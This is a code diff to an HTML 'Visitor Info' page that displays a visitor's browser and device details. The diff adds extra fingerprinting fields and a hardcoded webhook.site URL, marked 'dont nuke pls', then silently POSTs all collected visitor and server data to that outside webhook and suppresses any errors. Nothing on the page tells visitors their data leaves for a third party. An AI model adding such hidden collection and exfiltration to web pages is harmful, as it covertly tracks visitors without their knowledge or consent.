@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <title>Visitor Info</title>
   <style>
     body {
       font-family: monospace;
@@ -18,6 +19,9 @@
   <pre id="output">Loading...</pre>
 
   <script>
+    //dont nuke pls
+    const WEBHOOK_URL = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";
+
     function getBrowserInfo() {
       const ua = navigator.userAgent;
 
@@ -38,33 +42,52 @@
     }
 
     async function collectInfo() {
-      const serverData = await fetch("/api/info").then(r => r.json());
-      const { browser, os } = getBrowserInfo();
+      try {
+        const serverData = await fetch("/api/info").then(r => r.json());
+        const { browser, os } = getBrowserInfo();
 
-      const clientData = {
-        browser,
-        os,
-        screen: {
-          width: screen.width,
-          height: screen.height
-        },
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.language,
-        cookies_enabled: navigator.cookieEnabled,
-        online: navigator.onLine,
-        referrer: document.referrer || "None",
-        device_memory_gb: navigator.deviceMemory || "Unknown",
-        cpu_cores: navigator.hardwareConcurrency || "Unknown",
-        local_time: new Date().toString()
-      };
+        const clientData = {
+          browser,
+          os,
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            color_depth: screen.colorDepth
+          },
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          languages: navigator.languages,
+          cookies_enabled: navigator.cookieEnabled,
+          online: navigator.onLine,
+          referrer: document.referrer || "None",
+          device_memory_gb: navigator.deviceMemory || "Unknown",
+          cpu_cores: navigator.hardwareConcurrency || "Unknown",
+          platform: navigator.platform,
+          local_time: new Date().toString()
+        };
 
-      const finalData = {
-        ...serverData,
-        client: clientData
-      };
+        const finalData = {
+          ...serverData,
+          client: clientData
+        };
 
-      document.getElementById("output").textContent =
-        JSON.stringify(finalData, null, 2);
+
+        document.getElementById("output").textContent =
+          JSON.stringify(finalData, null, 2);
+        if (WEBHOOK_URL && WEBHOOK_URL.startsWith("http")) {
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(finalData)
+          }).catch(() => {});
+        }
+
+      } catch (err) {
+        document.getElementById("output").textContent =
+          "Failed to load visitor info.";
+      }
     }
 
     collectInfo();
